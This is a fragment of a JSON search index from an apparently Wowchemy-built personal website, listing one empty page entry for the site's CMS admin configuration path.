paper","type":"publication"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"f26b5133c34eec1aa0a09390a36c2ade","permalink":"https://mohamed-elleuch.me/admin/config.yml","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/admin/config.yml","section":"","summary":"","tags":null,"title":"","type":"wowchemycms"}]